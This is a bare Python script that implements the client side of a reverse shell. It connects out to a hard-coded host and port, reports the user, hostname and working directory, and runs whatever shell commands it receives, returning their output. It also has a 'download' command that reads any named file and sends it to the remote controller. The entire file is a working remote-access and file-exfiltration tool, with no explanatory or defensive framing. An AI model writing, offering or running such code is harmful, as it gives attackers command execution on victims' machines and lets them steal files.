import getpass
import os
import platform
import socket
import subprocess
import sys

host = "localhost"
port = 1254
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))
print("[+] Access Connection ")
while True:
    target_sys_info = f"""┌─[{getpass.getuser()}@{platform.node()}]─[{os.getcwd()}]\n└──╼ $"""
    sock.send(target_sys_info.encode())
    cmd = sock.recv(1024).decode()
    if 'exit' in cmd:
        sys.exit()
    elif cmd == 'download':
        file_name = sock.recv(1024).decode()
        if os.path.exists(file_name):
            file = open(file_name, 'rb')
            data = file.read(1024)
            while len(data) > 0:
                sock.send(data)
                data = file.read(1024)
            sock.send('DONE'.encode())
    else:
        CMD = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        STDOUT, STDERR = CMD.communicate()
        if not STDOUT:
            sock.send(STDERR)
        else:
            sock.send(STDOUT)
